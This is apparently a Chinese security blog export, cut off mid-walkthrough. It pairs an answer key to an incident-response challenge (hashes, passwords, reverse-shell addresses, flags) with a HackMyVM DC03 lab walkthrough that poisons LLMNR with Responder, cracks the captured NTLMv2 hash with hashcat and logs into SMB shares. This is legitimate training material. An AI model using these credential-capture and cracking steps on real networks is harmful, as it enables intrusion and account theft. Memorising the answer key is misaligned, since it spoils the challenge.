<p><img src="https://ooo.0x0.ooo/2024/04/22/OpeikF.png" alt="OpeikF.png" loading="lazy"><br><code>[nidewen]</code></p>
<h3 id="应急响应-25"><a href="#应急响应-25" class="headerlink" title="应急响应-25"></a>应急响应-25</h3><blockquote>
<p>提交办公区存在的恶意用户名</p>
</blockquote>
<p>开机 PC01 看用户<br><code>[hacker]</code></p>
<h3 id="应急响应-26"><a href="#应急响应-26" class="headerlink" title="应急响应-26"></a>应急响应-26</h3><blockquote>
<p>提交恶意用户密码到期时间<br>net user hacker<br><code>[[2024/5/28/21:40:37]]</code></p>
</blockquote>
<h3 id="应急响应-27"><a href="#应急响应-27" class="headerlink" title="应急响应-27"></a>应急响应-27</h3><blockquote>
<p>请对办公区留存的镜像取证并指出内存疑似恶意进程</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/22/Openm6.webp" alt="Openm6.webp" loading="lazy"><br><code>[.hack.ex]</code></p>
<h3 id="应急响应-28"><a href="#应急响应-28" class="headerlink" title="应急响应-28"></a>应急响应-28</h3><blockquote>
<p>请指出该员工使用的公司OA平台的密码</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKF6j.png" alt="OpKF6j.png" loading="lazy"><br>把pc1里面raw.raw导出用volatility3分析<br><img src="https://ooo.0x0.ooo/2024/04/23/OpKikp.png" alt="OpKikp.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/04/23/OpKnpU.png" alt="OpKnpU.png" loading="lazy"><br><code>[liuling7541]</code></p>
<h3 id="应急响应-29"><a href="#应急响应-29" class="headerlink" title="应急响应-29"></a>应急响应-29</h3><blockquote>
<p>攻击者传入一个木马文件并做了权限维持，请问木马文件名是什么</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/23/OpK1YY.png" alt="OpK1YY.png" loading="lazy"><br>查看剪切板里面有个h4ck3d!，是传入的木马<br><code>[h4ck3d!]</code></p>
<h3 id="应急响应-30"><a href="#应急响应-30" class="headerlink" title="应急响应-30"></a>应急响应-30</h3><blockquote>
<p>请提交该计算机中记录的重要联系人的家庭住址</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKN5v.png" alt="OpKN5v.png" loading="lazy"><br>找到一个中文乱码，看别人的wp发现是王总然后提取出来<br><code>[秋水省雁荡市碧波区千屿山庄1号]</code></p>
<h3 id="应急响应-31"><a href="#应急响应-31" class="headerlink" title="应急响应-31"></a>应急响应-31</h3><blockquote>
<p>请提交近源靶机上的恶意文件哈希</p>
</blockquote>
<p>pc2上有个artifact文件，用<code>Get-FileHash artifact.exe -Algorithm MD5</code>获取文件md5<br><img src="https://ooo.0x0.ooo/2024/04/23/OpKeKq.webp" alt="OpKeKq.webp" loading="lazy"><br><code>[a7fcd0b15a080167c4c2f05063802a6e]</code></p>
<h3 id="应急响应-32"><a href="#应急响应-32" class="headerlink" title="应急响应-32"></a>应急响应-32</h3><blockquote>
<p>提交恶意程序的外联地址</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKrSc.webp" alt="OpKrSc.webp" loading="lazy"><br><code>[101.78.63.44]</code></p>
<h3 id="应急响应-33"><a href="#应急响应-33" class="headerlink" title="应急响应-33"></a>应急响应-33</h3><blockquote>
<p>提交攻击者使用内网扫描工具的哈希</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKAwr.png" alt="OpKAwr.png" loading="lazy"><br>传的 fscan，看操作日志确定版本是 1.8.3<br><code>[1facdcd05c43ba4d37274dffc90b6d4e]</code></p>
<h3 id="应急响应-34"><a href="#应急响应-34" class="headerlink" title="应急响应-34"></a>应急响应-34</h3><blockquote>
<p>请提交攻击者在站点上留下的后门密码</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKZ1M.png" alt="OpKZ1M.png" loading="lazy"><br>看waf，连接密码是123<br><code>[123]</code></p>
<h3 id="应急响应-35"><a href="#应急响应-35" class="headerlink" title="应急响应-35"></a>应急响应-35</h3><blockquote>
<p>请提交攻击者在数据库留下的信息</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKvDG.png" alt="OpKvDG.png" loading="lazy"><br><code>[flag&#123;hack_palu&#125;]</code></p>
<h3 id="应急响应-36"><a href="#应急响应-36" class="headerlink" title="应急响应-36"></a>应急响应-36</h3><blockquote>
<p>提交攻击者在监控服务器上留下的dcnlog地址</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKy81.png" alt="OpKy81.png" loading="lazy"><br><code>[oalu.dcnlog.cn]</code></p>
<h3 id="应急响应-37"><a href="#应急响应-37" class="headerlink" title="应急响应-37"></a>应急响应-37</h3><blockquote>
<p>提交监控服务器上恶意用户的上一次登录时间</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKmkI.png" alt="OpKmkI.png" loading="lazy"><br><code>[2024/04/17/01:32:44]</code></p>
<h3 id="应急响应-38"><a href="#应急响应-38" class="headerlink" title="应急响应-38"></a>应急响应-38</h3><blockquote>
<p>提交监控服务器上遗留的反弹shell地址和端口</p>
</blockquote>
<p>同36图，base64解码<br><img src="https://ooo.0x0.ooo/2024/04/23/OpKppD.png" alt="OpKppD.png" loading="lazy"><br><code>[154.183.110.12:7890]</code></p>
<h3 id="应急响应-39"><a href="#应急响应-39" class="headerlink" title="应急响应-39"></a>应急响应-39</h3><blockquote>
<p>提交恶意钓鱼文件的哈希</p>
</blockquote>
<p>pc2有个初稿文件，应该是钓鱼文件<br><img src="https://ooo.0x0.ooo/2024/04/23/OpKR56.png" alt="OpKR56.png" loading="lazy"><br><code>[[da75025ff7f3b6baa27f5913c1c83063]]</code></p>
<h3 id="应急响应-40"><a href="#应急响应-40" class="headerlink" title="应急响应-40"></a>应急响应-40</h3><blockquote>
<p>提交恶意文件外连IP</p>
</blockquote>
<p>不会</p>
<h3 id="应急响应-41"><a href="#应急响应-41" class="headerlink" title="应急响应-41"></a>应急响应-41</h3><blockquote>
<p>提交被恶意文件钓鱼使用者的姓名</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKJfF.png" alt="OpKJfF.png" loading="lazy"><br><code>[陈琚鹭]</code></p>
<h3 id="应急响应-42"><a href="#应急响应-42" class="headerlink" title="应急响应-42"></a>应急响应-42</h3><blockquote>
<p>提交攻击者留下的信息</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKtKP.webp" alt="OpKtKP.webp" loading="lazy"><br><code>flag&#123;2024-04-17-hi&#125;</code></p>
<h3 id="应急响应-43"><a href="#应急响应-43" class="headerlink" title="应急响应-43"></a>应急响应-43</h3><blockquote>
<p>提交恶意用户数量</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/23/OpK40b.png" alt="OpK40b.png" loading="lazy"><br>49个<br><code>[f457c545a9ded88f18ecee47145a72c0]</code></p>
<h3 id="应急响应-44"><a href="#应急响应-44" class="headerlink" title="应急响应-44"></a>应急响应-44</h3><blockquote>
<p>请提交员工集体使用的密码</p>
</blockquote>
<p>试了一下Network@2020对了<br><code>[Network@2020]</code></p>
<h3 id="应急响应-45"><a href="#应急响应-45" class="headerlink" title="应急响应-45"></a>应急响应-45</h3><blockquote>
<p>提交加密文件的哈希</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKDwl.webp" alt="OpKDwl.webp" loading="lazy"><br><code>[2bf71a0d6d4e70cec7602da2b653e2ab]</code></p>
<h3 id="应急响应-46"><a href="#应急响应-46" class="headerlink" title="应急响应-46"></a>应急响应-46</h3><blockquote>
<p>提交被攻击者加密的内容明文</p>
</blockquote>
<p>同密码题<br><code>[2024ispassword]</code></p>
<h3 id="应急响应-47"><a href="#应急响应-47" class="headerlink" title="应急响应-47"></a>应急响应-47</h3><blockquote>
<p>请提交符合基线标准的服务器数量</p>
</blockquote>
<p>0个<br><code>[cfcd208495d565ef66e7dff9f98764da]</code></p>
<h3 id="应急响应-48-51"><a href="#应急响应-48-51" class="headerlink" title="应急响应-48-51"></a>应急响应-48-51</h3><blockquote>
<p>提交办公区的恶意文件哈希<br>提交恶意回连端口<br>提交恶意程序中的flag<br>提交恶意文件中的search_for_text内容</p>
</blockquote>
<p><img src="https://ooo.0x0.ooo/2024/04/23/OpKEHB.webp" alt="OpKEHB.webp" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/04/23/OpKL1g.webp" alt="OpKL1g.webp" loading="lazy"><br><code>[5232a191eb2913337e0a93b0a990f2a2]</code><br><code>[22]</code><br><code>[flag&#123;234567uyhgn_aiduyai&#125;]</code><br><code>[passwod]</code></p>
<h3 id="应急响应-52"><a href="#应急响应-52" class="headerlink" title="应急响应-52"></a>应急响应-52</h3><blockquote>
<p>提交web服务器上攻击者修改后的root密码</p>
</blockquote>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
  </entry>
  <entry>
    <title>HackMyVM-DC03</title>
    <url>/posts/eb50c0ea/</url>
    <content><![CDATA[<p><strong>难度:Medium</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.126</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  arp-scan <span class="token parameter variable">-l</span>                                                                                                                                                                            <span class="token punctuation">[</span><span class="token number">15</span>:58:03<span class="token punctuation">]</span> Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.1.100
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.1.1     <span class="token number">78</span>:60:5b:04:b4:8c       TP-LINK TECHNOLOGIES CO.,LTD.
<span class="token number">192.168</span>.1.102   08:00:27:6a:d2:74       PCS Systemtechnik GmbH</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/dc03<span class="token punctuation">]</span> ➜  nmap <span class="token parameter variable">-n</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sS</span> -p- --min-rate<span class="token operator">=</span><span class="token string">"5000"</span> <span class="token number">192.168</span>.1.102 <span class="token parameter variable">-oG</span> ports.txt                                                                                                         <span class="token punctuation">[</span><span class="token number">15</span>:58:36<span class="token punctuation">]</span> Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-08-08 <span class="token number">15</span>:58 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.102
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00036s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65517</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT      STATE SERVICE
<span class="token number">53</span>/tcp    <span class="token function">open</span>  domain
<span class="token number">88</span>/tcp    <span class="token function">open</span>  kerberos-sec
<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc
<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn
<span class="token number">389</span>/tcp   <span class="token function">open</span>  ldap
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds
<span class="token number">464</span>/tcp   <span class="token function">open</span>  kpasswd5
<span class="token number">593</span>/tcp   <span class="token function">open</span>  http-rpc-epmap
<span class="token number">636</span>/tcp   <span class="token function">open</span>  ldapssl
<span class="token number">3268</span>/tcp  <span class="token function">open</span>  globalcatLDAP
<span class="token number">3269</span>/tcp  <span class="token function">open</span>  globalcatLDAPssl
<span class="token number">5985</span>/tcp  <span class="token function">open</span>  wsman
<span class="token number">9389</span>/tcp  <span class="token function">open</span>  adws
<span class="token number">49664</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49667</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49674</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49715</span>/tcp <span class="token function">open</span>  unknown
<span class="token number">49772</span>/tcp <span class="token function">open</span>  unknown</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/dc03<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> ports.txt <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-oP</span> <span class="token string">'\d&#123;1,5&#125;/open'</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1&#125;'</span> <span class="token assign-left variable">FS</span><span class="token operator">=</span><span class="token string">'/'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">' '</span> <span class="token string">','</span>                                                                                    <span class="token punctuation">[</span><span class="token number">15</span>:59:21<span class="token punctuation">]</span> <span class="token number">53,88</span>,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49674,49715,49772
root@kali2 <span class="token punctuation">[</span>~/Desktop/dc03<span class="token punctuation">]</span> ➜  nmap <span class="token number">192.168</span>.1.102 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49674,49715,49772                                                           <span class="token punctuation">[</span><span class="token number">15</span>:59:22<span class="token punctuation">]</span> Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-08-08 <span class="token number">15</span>:59 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.102
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0015s latency<span class="token punctuation">)</span>.

PORT      STATE SERVICE       VERSION
<span class="token number">53</span>/tcp    <span class="token function">open</span>  domain        Simple DNS Plus
<span class="token number">88</span>/tcp    <span class="token function">open</span>  kerberos-sec  Microsoft Windows Kerberos <span class="token punctuation">(</span>server time: <span class="token number">2024</span>-08-08 <span class="token number">22</span>:59:42Z<span class="token punctuation">)</span>
<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
<span class="token number">389</span>/tcp   <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds?
<span class="token number">464</span>/tcp   <span class="token function">open</span>  kpasswd5?
<span class="token number">593</span>/tcp   <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
<span class="token number">636</span>/tcp   <span class="token function">open</span>  tcpwrapped
<span class="token number">3268</span>/tcp  <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token number">3269</span>/tcp  <span class="token function">open</span>  tcpwrapped
<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token operator">|</span>_http-title: Not Found
<span class="token number">9389</span>/tcp  <span class="token function">open</span>  mc-nmf        .NET Message Framing
<span class="token number">49664</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49667</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49674</span>/tcp <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
<span class="token number">49715</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49772</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC</code></pre>
<p>域名<code>SOUPEDECODE.LOCAL</code><br>然后我就经过了一系列的枚举爆破，结果是一无所有…..</p>
<h2 id="responder"><a href="#responder" class="headerlink" title="responder"></a>responder</h2><p>过了好几天，重新打开这个靶机，我想到了之前做过的responder LLMNR欺骗实验，就随便一试，结果抓到了NTLM 哈希，说明开启了LLMNR<br><a href="https://tao0845.github.io/posts/b774aeb/?highlight=llmnr">https://tao0845.github.io/posts/b774aeb/?highlight=llmnr</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  responder <span class="token parameter variable">-I</span> eth0  <span class="token parameter variable">-wd</span>  
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.
<span class="token operator">!</span><span class="token punctuation">]</span> Error starting TCP server on port <span class="token number">80</span>, check permissions or other servers running.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>DHCP<span class="token punctuation">]</span> Found DHCP server IP: <span class="token number">192.168</span>.1.1, now waiting <span class="token keyword">for</span> incoming requests<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.1.106   <span class="token keyword">for</span> name FileServer.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::c1b0:ce8d:8998:df5f <span class="token keyword">for</span> name FileServer
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>NBT-NS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.1.106 <span class="token keyword">for</span> name FILESERVER <span class="token punctuation">(</span>service: File Server<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.1.106 <span class="token keyword">for</span> name FileServer
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.1.106   <span class="token keyword">for</span> name FileServer.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to fe80::c1b0:ce8d:8998:df5f <span class="token keyword">for</span> name FileServer.local
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::c1b0:ce8d:8998:df5f <span class="token keyword">for</span> name FileServer
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.1.106 <span class="token keyword">for</span> name FileServer
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>MDNS<span class="token punctuation">]</span> Poisoned answer sent to fe80::c1b0:ce8d:8998:df5f <span class="token keyword">for</span> name FileServer.local
<span class="token punctuation">[</span>SMB<span class="token punctuation">]</span> NTLMv2-SSP Client   <span class="token builtin class-name">:</span> fe80::c1b0:ce8d:8998:df5f
<span class="token punctuation">[</span>SMB<span class="token punctuation">]</span> NTLMv2-SSP Username <span class="token builtin class-name">:</span> soupedecode<span class="token punctuation">\</span>xkate578
<span class="token punctuation">[</span>SMB<span class="token punctuation">]</span> NTLMv2-SSP Hash     <span class="token builtin class-name">:</span> xkate578::soupedecode:e5de4a041c0c5baf:1776C6B1BAFC80407A72C8F6224B5D46:010100000000000000FE943AF0ECDA014FA0C54BE4CDB8100000000002000800540057005800370001001E00570049004E002D004B00390056003200350030003700590053004A00490004003400570049004E002D004B00390056003200350030003700590053004A0049002E0054005700580037002E004C004F00430041004C000300140054005700580037002E004C004F00430041004C000500140054005700580037002E004C004F00430041004C000700080000FE943AF0ECDA010600040002000000080030003000000000000000000000000040000013318A47756763C1D6FA36FF24424AEC93E3E070AEDFFD1C6A19F37355FEB48D0A0010000000000000000000000000000000000009001E0063006900660073002F00460069006C0065005300650072007600650072000000000000000000
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Exiting<span class="token punctuation">..</span></code></pre>
<p>用hashcat爆破</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/dc03<span class="token punctuation">]</span> ➜  hashcat aaa /usr/share/wordlists/rockyou.txt <span class="token parameter variable">--force</span> <span class="token parameter variable">-m</span> <span class="token number">5600</span>                                                                                                                                        <span class="token punctuation">[</span><span class="token number">19</span>:48:14<span class="token punctuation">]</span>
hashcat <span class="token punctuation">(</span>v6.2.6<span class="token punctuation">)</span> starting

You have enabled <span class="token parameter variable">--force</span> to bypass dangerous warnings and errors<span class="token operator">!</span>
This can hide serious problems and should only be <span class="token keyword">done</span> when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API <span class="token punctuation">(</span>OpenCL <span class="token number">3.0</span> PoCL <span class="token number">5.0</span>+debian  Linux, None+Asserts, RELOC, SPIR, LLVM <span class="token number">16.0</span>.6, SLEEF, DISTRO, POCL_DEBUG<span class="token punctuation">)</span> - Platform <span class="token comment">#1 [The pocl project]</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
* Device <span class="token comment">#1: cpu-haswell-12th Gen Intel(R) Core(TM) i7-12700H, 1142/2349 MB (512 MB allocatable), 1MCU</span>

Minimum password length supported by kernel: <span class="token number">0</span>
Maximum password length supported by kernel: <span class="token number">256</span>

Hashes: <span class="token number">1</span> digests<span class="token punctuation">;</span> <span class="token number">1</span> unique digests, <span class="token number">1</span> unique salts
Bitmaps: <span class="token number">16</span> bits, <span class="token number">65536</span> entries, 0x0000ffff mask, <span class="token number">262144</span> bytes, <span class="token number">5</span>/13 rotates
Rules: <span class="token number">1</span>

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION<span class="token operator">!</span> Pure <span class="token punctuation">(</span>unoptimized<span class="token punctuation">)</span> backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append <span class="token parameter variable">-O</span> to your commandline.
See the above message to <span class="token function">find</span> out about the exact limits.

Watchdog: Temperature abort trigger <span class="token builtin class-name">set</span> to 90c

Host memory required <span class="token keyword">for</span> this attack: <span class="token number">0</span> MB

Dictionary cache built:
* Filename<span class="token punctuation">..</span>: /usr/share/wordlists/rockyou.txt
* Passwords.: <span class="token number">14344394</span>
* Bytes<span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">139921521</span>
* Keyspace<span class="token punctuation">..</span>: <span class="token number">14344387</span>
* Runtime<span class="token punctuation">..</span>.: <span class="token number">1</span> sec

XKATE578::soupedecode:e5de4a041c0c5baf:1776c6b1bafc80407a72c8f6224b5d46:010100000000000000fe943af0ecda014fa0c54be4cdb8100000000002000800540057005800370001001e00570049004e002d004b00390056003200350030003700590053004a00490004003400570049004e002d004b00390056003200350030003700590053004a0049002e0054005700580037002e004c004f00430041004c000300140054005700580037002e004c004f00430041004c000500140054005700580037002e004c004f00430041004c000700080000fe943af0ecda010600040002000000080030003000000000000000000000000040000013318a47756763c1d6fa36ff24424aec93e3e070aedffd1c6a19f37355feb48d0a0010000000000000000000000000000000000009001e0063006900660073002f00460069006c0065005300650072007600650072000000000000000000:jesuschrist</code></pre>
<p>拿到密码<code>jesuschrist</code>，winrm登录不了，看一下smb</p>
<h2 id="smb探测"><a href="#smb探测" class="headerlink" title="smb探测"></a>smb探测</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/dc03<span class="token punctuation">]</span> ➜  smbmap <span class="token parameter variable">-u</span> XKATE578 <span class="token parameter variable">-p</span> jesuschrist <span class="token parameter variable">-H</span> <span class="token number">192.168</span>.1.106                                                                                                                                                  <span class="token punctuation">[</span><span class="token number">19</span>:53:24<span class="token punctuation">]</span>

    ________  ___      ___  _______   ___      ___       __         _______
   /<span class="token string">"       )|"</span>  <span class="token punctuation">\</span>    /<span class="token string">"  ||   _  "</span><span class="token punctuation">\</span> <span class="token operator">|</span><span class="token string">"  \    /"</span>  <span class="token operator">|</span>     /<span class="token string">""</span><span class="token punctuation">\</span>       <span class="token operator">|</span>   __ <span class="token string">"\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /"</span> <span class="token punctuation">\</span>   <span class="token builtin class-name">:</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token builtin class-name">.</span>  <span class="token punctuation">\</span>    /:  <span class="token operator">||</span><span class="token builtin class-name">:</span> <span class="token operator">|</span>_<span class="token punctuation">)</span>  <span class="token builtin class-name">:</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin class-name">.</span>  <span class="token punctuation">\</span>    /:  <span class="token operator">|</span> /   /  <span class="token punctuation">\</span>   <span class="token punctuation">\</span>  /<span class="token operator">|</span>__/ <span class="token punctuation">\</span>
  <span class="token punctuation">(</span>_______/  <span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__/<span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">(</span>_______/ <span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__/<span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">(</span>___/    <span class="token punctuation">\</span>___<span class="token punctuation">)</span><span class="token punctuation">(</span>_______<span class="token punctuation">)</span>
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.4 <span class="token operator">|</span> Shawn Evans - ShawnDEvans@gmail.com<span class="token operator">&lt;</span>mailto:ShawnDEvans@gmail.com<span class="token operator">></span>
                     https://github.com/ShawnDEvans/smbmap

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Detected <span class="token number">1</span> hosts serving SMB                                                                                                  
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Established <span class="token number">1</span> SMB connections<span class="token punctuation">(</span>s<span class="token punctuation">)</span> and <span class="token number">1</span> authenticated session<span class="token punctuation">(</span>s<span class="token punctuation">)</span>                                                      
                                                                                                                             
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> IP: <span class="token number">192.168</span>.1.106:445	Name: <span class="token number">192.168</span>.1.106       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	share                                             	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Closed <span class="token number">1</span> connections </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop/dc03<span class="token punctuation">]</span> ➜  smbclient <span class="token parameter variable">-U</span> <span class="token string">'XKATE578%jesuschrist'</span>   //192.168.1.106/share                                                                                                                                         <span class="token punctuation">[</span><span class="token number">19</span>:54:06<span class="token punctuation">]</span>
Try <span class="token string">"help"</span> to get a list of possible commands.
smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
  <span class="token builtin class-name">.</span>                                  DR        <span class="token number">0</span>  Sat Aug <span class="token number">10</span> <span class="token number">15</span>:19:10 <span class="token number">2024</span>
  <span class="token punctuation">..</span>                                  D        <span class="token number">0</span>  Thu Aug  <span class="token number">1</span> <span class="token number">13</span>:38:08 <span class="token number">2024</span>
  desktop.ini                       AHS      <span class="token number">282</span>  Thu Aug  <span class="token number">1</span> <span class="token number">13</span>:38:08 <span class="token number">2024</span>
